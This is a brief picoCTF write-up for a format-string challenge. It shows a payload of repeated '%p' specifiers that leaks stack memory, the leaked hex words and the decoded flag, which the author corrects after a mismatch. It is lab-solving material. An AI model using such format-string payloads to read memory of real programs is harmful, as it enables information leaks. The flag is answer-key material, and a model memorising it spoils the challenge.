Exploit: "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"


This prints the contents of the stack as a pointer ie 8 byte in little endian format

    0x7b4654436f636970 0x355f31346d316e34 0x3478345f33317937 0x34365f673431665f 0x7d363131373732 0x70

Converting this from hex to string 

    picoCTF{4n1m41_57y13_4x4_f14g_64p277116}

(But this is wrong for some reason)

Okay so the correct flag is `picoCTF{4n1m41_57y13_4x4_f14g_64277116}`

Cyberchef was giving wrong answer for some reason
